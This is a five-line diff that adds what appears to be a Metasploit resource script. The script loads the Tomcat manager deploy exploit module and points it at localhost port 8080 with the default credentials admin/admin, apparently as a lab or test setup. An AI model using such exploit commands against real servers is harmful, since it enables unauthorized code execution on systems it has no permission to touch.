@@ -1,0 +1,5 @@
+use exploit/multi/http/tomcat_mgr_deploy
+set RHOST 127.0.0.1
+set RPORT 8080
+set HttpUsername admin
+set HttpPassword admin
